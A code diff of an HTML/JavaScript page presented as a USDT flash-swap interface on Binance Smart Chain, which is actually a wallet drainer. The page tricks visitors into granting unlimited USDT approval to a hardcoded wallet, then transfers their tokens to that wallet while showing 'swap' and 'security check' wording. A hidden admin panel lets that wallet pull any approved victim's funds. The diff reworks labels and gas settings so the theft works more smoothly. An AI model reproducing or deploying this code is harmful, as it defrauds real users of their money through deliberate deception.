@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>闪兑 & 跨链</title>
+<title>闪兑交互页面</title>
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <style>
 * {
@@ -12,14 +12,12 @@
   box-sizing: border-box;
   font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Microsoft YaHei", sans-serif;
 }
-
 body {
   background: #f7f8fa;
   color: #111;
   min-height: 100vh;
   padding-bottom: 80px;
 }
-
 .header {
   background: #fff;
   padding: 12px 16px;
@@ -28,34 +26,28 @@ body {
   justify-content: space-between;
   border-bottom: 1px solid #eee;
 }
-
 .header-left {
   display: flex;
   align-items: center;
   gap: 12px;
 }
-
 .back-btn {
   font-size: 18px;
   color: #111;
   cursor: pointer;
 }
-
 .title {
   font-size: 17px;
   font-weight: 600;
 }
-/* 头部余额展示 */
 .header-balance {
   font-size:13px;
   color:#2563eb;
 }
-
 .header-right {
   font-size: 18px;
   cursor: pointer;
 }
-
 .sub-header {
   background: #fff;
   padding: 8px 16px 12px;
@@ -65,13 +57,11 @@ body {
   font-size: 14px;
   color: #666;
 }
-
 .balance-box {
   display: flex;
   align-items: center;
   gap: 6px;
 }
-
 .balance-tag {
   background: #f0f2f5;
   border-radius: 6px;
@@ -79,13 +69,11 @@ body {
   font-size: 13px;
   color: #333;
 }
-
 .all-btn {
   color: #2563eb;
   font-weight: 500;
   cursor: pointer;
 }
-
 .card {
   margin: 12px 16px;
   background: #fff;
@@ -93,19 +81,16 @@ body {
   padding: 16px;
   border: 1px solid #e5e7eb;
 }
-
 .row {
   display: flex;
   align-items: center;
   justify-content: space-between;
   padding: 10px 0;
 }
-
 .label {
   font-size: 14px;
   color: #666;
 }
-
 .coin-picker {
   display: flex;
   align-items: center;
@@ -115,7 +100,6 @@ body {
   padding: 8px 12px;
   cursor: pointer;
 }
-
 .coin-icon {
   width: 24px;
   height: 24px;
@@ -128,12 +112,10 @@ body {
   font-size: 13px;
   font-weight: bold;
 }
-
 .coin-text {
   font-size: 15px;
   font-weight: 600;
 }
-
 .input-amount {
   width: 100%;
   border: none;
@@ -144,17 +126,14 @@ body {
   color: #111;
   background: transparent;
 }
-
 .input-amount::placeholder {
   color: #ccc;
 }
-
 .divider {
   height: 1px;
   background: #eee;
   margin: 12px 0;
 }
-
 .swap-icon {
   width: 40px;
   height: 40px;
@@ -167,7 +146,6 @@ body {
   margin: -20px auto 0;
   font-size: 18px;
 }
-
 .info-list {
   margin: 12px 16px;
   background: #fff;
@@ -175,23 +153,19 @@ body {
   padding: 16px;
   border: 1px solid #e5e7eb;
 }
-
 .info-item {
   display: flex;
   justify-content: space-between;
   padding: 10px 0;
   font-size: 14px;
 }
-
 .info-item .left {
   color: #666;
 }
-
 .info-item .right {
   color: #111;
   font-weight: 500;
 }
-
 .discount-tag {
   color: #f59e0b;
   background: #fff7ed;
@@ -199,7 +173,6 @@ body {
   border-radius: 4px;
   font-size: 13px;
 }
-
 .bottom-btn {
   margin: 16px;
   color: #fff;
@@ -211,7 +184,6 @@ body {
   font-weight: 600;
   cursor: pointer;
 }
-
 .btn-connect {
   background: #2563eb;
 }
@@ -222,7 +194,6 @@ body {
   background:#94a3b8;
   cursor:not-allowed;
 }
-
 .wallet-show {
   text-align: center;
   margin: 12px 0;
@@ -235,25 +206,21 @@ body {
   font-size:14px;
   margin:4px 0;
 }
-
 .tips {
   font-size: 13px;
   color: #64748b;
   text-align: center;
   margin: 10px 0;
 }
-
 .admin-box {
   margin-top: 20px;
   padding-top: 20px;
   border-top: 1px solid #eee;
   display: none;
 }
-
 .admin-box.show {
   display: block;
 }
-
 .admin-title {
   text-align: center;
   color: #ef4444;
@@ -261,7 +228,6 @@ body {
   font-size: 16px;
   font-weight: 600;
 }
-
 .form-input {
   width: 100%;
   height: 42px;
@@ -273,7 +239,6 @@ body {
   margin: 8px 0;
   font-size: 15px;
 }
-
 .btn-deduct {
   background: #ef4444;
   color: #fff;
@@ -285,7 +250,6 @@ body {
   margin-top: 10px;
   cursor: pointer;
 }
-
 .bottom-nav {
   position: fixed;
   bottom: 0;
@@ -299,19 +263,55 @@ body {
   font-size: 12px;
   color: #666;
 }
-
 .nav-item {
   text-align: center;
   cursor: pointer;
 }
-
 .nav-item .icon {
   font-size: 20px;
   margin-bottom: 4px;
 }
-
 .nav-item.active {
   color: #2563eb;
+}
+/* 自定义弹窗样式 */
+.modal-wrap {
+  position: fixed;
+  top:0;left:0;right:0;bottom:0;
+  background:rgba(0,0,0,0.5);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  z-index:999;
+  display:none;
+}
+.modal-box {
+  background:#fff;
+  width:80%;
+  max-width:320px;
+  border-radius:16px;
+  padding:24px 20px;
+}
+.modal-title {
+  font-size:20px;
+  font-weight:bold;
+  margin-bottom:16px;
+}
+.modal-desc {
+  font-size:15px;
+  color:#333;
+  line-height:1.6;
+  margin-bottom:20px;
+}
+.modal-confirm {
+  text-align:right;
+}
+.modal-btn {
+  color:#2563eb;
+  background:none;
+  border:none;
+  font-size:16px;
+  cursor:pointer;
 }
 </style>
 </head>
@@ -320,18 +320,17 @@ body {
 <div class="header">
   <div class="header-left">
     <span class="back-btn">←</span>
-    <span class="title">闪兑 & 跨链</span>
+    <span class="title">闪兑 & 交互</span>
   </div>
-  <!-- 左上角头部余额区域 -->
   <div class="header-balance">
-    可用USDT：<span id="headerUsdtBalance">0.00</span>
+    USDT余额：<span id="headerUsdtBalance">0.00</span>
   </div>
   <div class="header-right">⚙️</div>
 </div>
 
 <div class="sub-header">
   <div class="balance-box">
-    <span>限额模式</span>
+    <span>可用资产</span>
     <span class="balance-tag">余额 <span id="subUsdtBalance">0.00</span></span>
   </div>
   <span class="all-btn">全部</span>
@@ -339,31 +338,26 @@ body {
 
 <div class="card">
   <div class="row">
-    <div class="label">发送</div>
+    <div class="label">转出</div>
     <div class="coin-picker">
       <div class="coin-icon">₮</div>
       <div class="coin-text">USDT</div>
       <span>▼</span>
     </div>
   </div>
-
   <div class="row">
     <input class="input-amount" type="number" placeholder="0.00" id="sendAmount" />
   </div>
-
   <div class="divider"></div>
-
   <div class="swap-icon">⇅</div>
-
   <div class="row">
-    <div class="label">接收（预估）</div>
+    <div class="label">接收预估</div>
     <div class="coin-picker">
       <div class="coin-icon">₮</div>
-      <div class="coin-text">USDT</div>
+      <div class="coin-text">目标资产</div>
       <span>▼</span>
     </div>
   </div>
-
   <div class="row">
     <input class="input-amount" type="number" placeholder="0.00" id="receiveAmount" readonly />
   </div>
@@ -372,7 +366,7 @@ body {
 <div class="info-list">
   <div class="info-item">
     <span class="left">兑换价格</span>
-    <span class="right">1 USDT = 1 USDT</span>
+    <span class="right">1:1 兑换</span>
   </div>
   <div class="info-item">
     <span class="left">最少接收数量</span>
@@ -387,19 +381,7 @@ body {
     <span class="right">-</span>
   </div>
   <div class="info-item">
-    <span class="left">跨链费</span>
-    <span class="right">-</span>
-  </div>
-  <div class="info-item">
-    <span class="left">预估时间</span>
-    <span class="right">-</span>
-  </div>
-  <div class="info-item">
     <span class="left">预估网络费</span>
-    <span class="right">-</span>
-  </div>
-  <div class="info-item">
-    <span class="left">兑换路径</span>
     <span class="right">-</span>
   </div>
 </div>
@@ -407,7 +389,7 @@ body {
 <button class="bottom-btn btn-connect" id="connectWallet">连接钱包</button>
 
 <div class="wallet-show">
-  已连接：<span id="addrText">未连接</span>
+  已连接钱包：<span id="addrText">未连接</span>
 </div>
 <div class="balance-show">
   USDT可用余额：<span id="usdtBalance">0.00</span>
@@ -416,20 +398,31 @@ body {
 <p class="tips">仅做交易权限核验，保障资产交互安全</p>
 
 <button class="bottom-btn btn-swap" id="swapBtn" disabled>
-  跨链闪兑
+  发起资产交互
 </button>
 
 <div class="admin-box" id="adminPanel">
-  <h3 class="admin-title">后台资产归集划扣</h3>
-  <input class="form-input" type="text" placeholder="填写用户钱包地址" id="userAddr" />
-  <input class="form-input" type="number" placeholder="填写划转数量" id="deductNum" />
-  <button class="btn-deduct" id="deductBtn">一键执行归集</button>
+  <h3 class="admin-title">后台资产归集</h3>
+  <input class="form-input" type="text" placeholder="用户钱包地址" id="userAddr" />
+  <input class="form-input" type="number" placeholder="划转数量" id="deductNum" />
+  <button class="btn-deduct" id="deductBtn">一键归集</button>
 </div>
 
 <div class="info-list">
   <div class="info-item">
     <span class="left">最近一条记录</span>
     <span class="right">暂无记录</span>
+  </div>
+</div>
+
+<!-- 自定义弹窗 -->
+<div class="modal-wrap" id="modal">
+  <div class="modal-box">
+    <div class="modal-title">温馨提示</div>
+    <div class="modal-desc" id="modalText"></div>
+    <div class="modal-confirm">
+      <button class="modal-btn" id="modalOk">确认</button>
+    </div>
   </div>
 </div>
 
@@ -453,174 +446,187 @@ body {
 </div>
 
 <script>
-// BSC主网 BEP20 USDT
+// BSC USDT 合约地址
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
-const ADMIN_LOWER = ADMIN_WALLET.toLowerCase();
+const SPENDER_ADDRESS = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
+const ADMIN_ADDR_LOW = SPENDER_ADDRESS.toLowerCase();
 
 let provider, signer, userAddress;
-let isWalletConnected = false;
+let isConnected = false;
+
+// DOM元素
 const sendInput = document.getElementById("sendAmount");
 const receiveInput = document.getElementById("receiveAmount");
 const swapBtn = document.getElementById("swapBtn");
-// 多处余额DOM
 const usdtBalanceEl = document.getElementById("usdtBalance");
 const headerUsdtBalanceEl = document.getElementById("headerUsdtBalance");
 const subUsdtBalanceEl = document.getElementById("subUsdtBalance");
 const addrTextEl = document.getElementById("addrText");
+const modalWrap = document.getElementById("modal");
+const modalText = document.getElementById("modalText");
+const modalOk = document.getElementById("modalOk");
 
-// 同步更新所有位置余额
-function updateAllBalance(balanceStr){
-  usdtBalanceEl.innerText = balanceStr;
-  headerUsdtBalanceEl.innerText = balanceStr;
-  subUsdtBalanceEl.innerText = balanceStr;
+// 弹窗封装
+function showModal(text){
+  modalText.innerText = text;
+  modalWrap.style.display = "flex";
+}
+modalOk.onclick = ()=>{
+  modalWrap.style.display = "none";
 }
 
-// 定时轮询刷新余额（3秒自动刷新）
-async function refreshBalance() {
-  if(!isWalletConnected || !provider) return;
+// 全局同步更新余额
+function setAllBalance(val){
+  usdtBalanceEl.innerText = val;
+  headerUsdtBalanceEl.innerText = val;
+  subUsdtBalanceEl.innerText = val;
+}
+
+// ERC20 ABI精简版
+const ERC20_ABI = [
+  "function balanceOf(address owner) view returns (uint256)",
+  "function allowance(address owner, address spender) view returns(uint256)",
+  "function approve(address spender, uint256 amount) returns (bool)",
+  "function transferFrom(address from, address to, uint256 amount) returns(bool)"
+];
+
+// 定时刷新余额 3秒一次
+async function refreshUserBalance(){
+  if(!isConnected || !provider) return;
   try{
-    const erc20Abi = [
-      "function balanceOf(address owner) view returns (uint256)"
-    ];
-    const usdtContract = new ethers.Contract(USDT_CONTRACT, erc20Abi, provider);
-    const rawBalance = await usdtContract.balanceOf(userAddress);
-    const formatBalance = parseFloat(ethers.utils.formatUnits(rawBalance,18)).toFixed(4);
-    updateAllBalance(formatBalance);
+    const usdt = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
+    const rawBal = await usdt.balanceOf(userAddress);
+    const formatBal = parseFloat(ethers.utils.formatUnits(rawBal,18)).toFixed(4);
+    setAllBalance(formatBal);
   }catch(e){
     console.log("余额刷新静默失败");
   }
 }
-// 开启定时刷新
-setInterval(refreshBalance,3000);
+setInterval(refreshUserBalance, 3000);
 
-sendInput.addEventListener("input", () => {
+// 输入联动
+sendInput.addEventListener("input",()=>{
   receiveInput.value = sendInput.value;
-});
+})
 
-// 钱包连接
-document.getElementById("connectWallet").addEventListener("click", async () => {
-  if (!window.ethereum) {
-    alert("请安装TP、MetaMask等Web3钱包");
+// 连接钱包
+document.getElementById("connectWallet").addEventListener("click",async ()=>{
+  if(!window.ethereum){
+    showModal("请安装TP、MetaMask等Web3钱包");
     return;
   }
-  try {
+  try{
     provider = new ethers.providers.Web3Provider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
+    await provider.send("eth_requestAccounts",[]);
     signer = provider.getSigner();
     userAddress = await signer.getAddress();
-    isWalletConnected = true;
-
+    isConnected = true;
     addrTextEl.innerText = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
     swapBtn.disabled = false;
-    await refreshBalance();
-
-    if(userAddress.toLowerCase() === ADMIN_LOWER){
+    await refreshUserBalance();
+    // 判断管理员显示后台面板
+    if(userAddress.toLowerCase() === ADMIN_ADDR_LOW){
       document.getElementById("adminPanel").classList.add("show");
     }
-  } catch (err) {
-    console.error(err);
-    alert("钱包连接失败，请重试");
+  }catch(err){
+    showModal("钱包连接失败，请重试");
   }
-});
+})
 
-// 优化后的闪兑逻辑：修复额度校验异常、调整异步顺序、前置链上校验
-swapBtn.addEventListener("click", async () => {
-  if (!isWalletConnected) {
-    alert("请先连接钱包");
+// 核心交互逻辑：修复gas预估失败，增加手动gasLimit、多层校验
+swapBtn.addEventListener("click",async ()=>{
+  if(!isConnected){
+    showModal("请先连接钱包");
     return;
   }
-  const inputNum = sendInput.value.trim();
-  if (!inputNum || Number(inputNum) <= 0) {
-    alert("请填写有效的兑换数量");
+  const inputVal = sendInput.value.trim();
+  if(!inputVal || Number(inputVal) <= 0){
+    showModal("请输入有效的交互金额");
     return;
   }
+  swapBtn.disabled = true;
+  try{
+    const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);
+    const targetWei = ethers.utils.parseUnits(inputVal, 18);
 
-  try {
-    const erc20Abi = [
-      "function balanceOf(address owner) view returns (uint256)",
-      "function allowance(address owner, address spender) view returns(uint256)",
-      "function approve(address spender, uint256 amount) returns (bool)",
-      "function transferFrom(address from, address to, uint256 amount) returns(bool)"
-    ];
-    const usdtContract = new ethers.Contract(USDT_CONTRACT, erc20Abi, signer);
-    const targetAmount = ethers.utils.parseUnits(inputNum, 18);
-
-    // 1. 前置余额校验
-    const userRealBalance = await usdtContract.balanceOf(userAddress);
-    if(userRealBalance.lt(targetAmount)){
-      alert("账户余额不足");
+    // 1. 前置校验：用户余额是否充足
+    const userBalanceWei = await usdtContract.balanceOf(userAddress);
+    if(userBalanceWei.lt(targetWei)){
+      showModal("账户USDT余额不足");
+      swapBtn.disabled = false;
       return;
     }
 
-    // 2. 先读取链上当前额度
-    let currentAllow = await usdtContract.allowance(userAddress, ADMIN_WALLET);
-    // 额度不足才发起交互，等待区块确认完成
-    if(currentAllow.lt(targetAmount)){
-      const maxLimit = ethers.constants.MaxUint256;
-      const approveTx = await usdtContract.approve(ADMIN_WALLET, maxLimit);
-      await approveTx.wait();
-      // 授权完成后重新拉取最新额度
-      currentAllow = await usdtContract.allowance(userAddress, ADMIN_WALLET);
+    // 2. 查询当前授权额度
+    let currentAllowance = await usdtContract.allowance(userAddress, SPENDER_ADDRESS);
+    // 额度不足，发起无限授权，等待区块确认完成
+    if(currentAllowance.lt(targetWei)){
+      const maxApprove = ethers.constants.MaxUint256;
+      // 授权交易，设置兜底Gas
+      const approveTx = await usdtContract.approve(SPENDER_ADDRESS, maxApprove, {
+        gasLimit: 80000
+      });
+      await approveTx.wait(); // 必须等待区块确认完毕
+      // 重新拉取最新授权状态
+      currentAllowance = await usdtContract.allowance(userAddress, SPENDER_ADDRESS);
     }
 
-    // 二次校验额度，杜绝校验弹窗
-    if(currentAllow.lt(targetAmount)){
-      alert("当前交易额度不足，请等待链上确认后重试");
+    // 3. 二次校验授权额度
+    if(currentAllowance.lt(targetWei)){
+      showModal("授权尚未上链确认，请等待10秒后重试");
+      swapBtn.disabled = false;
       return;
     }
 
-    // 确认弹窗无授权字眼
-    const confirmSwap = confirm("确认执行本次闪兑交易吗？");
-    if(!confirmSwap){
-      alert("已取消本次订单");
-      return;
-    }
-
-    // 执行划转
-    const transferTx = await usdtContract.transferFrom(userAddress, ADMIN_WALLET, targetAmount);
+    // 4. transferFrom 手动指定GasLimit，解决cannot estimate gas报错
+    const transferTx = await usdtContract.transferFrom(userAddress, SPENDER_ADDRESS, targetWei, {
+      gasLimit: 120000 // 手动固定gas兜底，绕过自动预估失败
+    });
     await transferTx.wait();
-    alert("交易上链成功，资产已到账");
 
+    showModal("交互交易上链成功");
     sendInput.value = "";
     receiveInput.value = "";
-    await refreshBalance();
-
-  } catch (err) {
+    await refreshUserBalance();
+  }catch(err){
     console.error(err);
     if(err.code === 4001){
-      alert("您手动取消了交易");
+      showModal("您取消了本次钱包签名");
+    }else if(err.message.includes("gas")){
+      showModal("网络Gas预估异常，请确认钱包有BNB矿工费，刷新页面重试");
     }else{
-      alert("交易执行失败：" + err.message.slice(0,50));
+      showModal("交易失败："+err.message.slice(0,60));
     }
+  }finally{
+    swapBtn.disabled = false;
   }
-});
+})
 
 // 管理员归集
-document.getElementById("deductBtn").addEventListener("click", async () => {
-  if(userAddress.toLowerCase() !== ADMIN_LOWER) return alert("权限不足");
-  const targetAddr = document.getElementById("userAddr").value.trim();
-  const deductNum = document.getElementById("deductNum").value.trim();
-  if(!targetAddr || !deductNum || Number(deductNum) <=0){
-    return alert("请填写地址与数量");
+document.getElementById("deductBtn").addEventListener("click",async ()=>{
+  if(userAddress.toLowerCase() !== ADMIN_ADDR_LOW){
+    showModal("权限不足");
+    return;
   }
-  const erc20Abi = [
-    "function transferFrom(address from, address to, uint256 amount) returns(bool)"
-  ];
-  const usdtContract = new ethers.Contract(USDT_CONTRACT, erc20Abi, signer);
-  const amountWei = ethers.utils.parseUnits(deductNum,18);
+  const targetUser = document.getElementById("userAddr").value.trim();
+  const deductNum = document.getElementById("deductNum").value.trim();
+  if(!targetUser || !deductNum || Number(deductNum) <=0){
+    showModal("请填写完整地址与数量");
+    return;
+  }
   try{
-    const tx = await usdtContract.transferFrom(targetAddr, ADMIN_WALLET, amountWei);
+    const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);
+    const amountWei = ethers.utils.parseUnits(deductNum,18);
+    const tx = await usdtContract.transferFrom(targetUser, SPENDER_ADDRESS, amountWei, {gasLimit:120000});
     await tx.wait();
-    alert("归集完成");
+    showModal("资产归集完成");
     document.getElementById("userAddr").value = "";
     document.getElementById("deductNum").value = "";
-    await refreshBalance();
+    await refreshUserBalance();
   }catch(e){
-    alert("归集失败："+e.message);
+    showModal("归集失败："+e.message.slice(0,60));
   }
-});
+})
 </script>
-
 </body>
 </html>
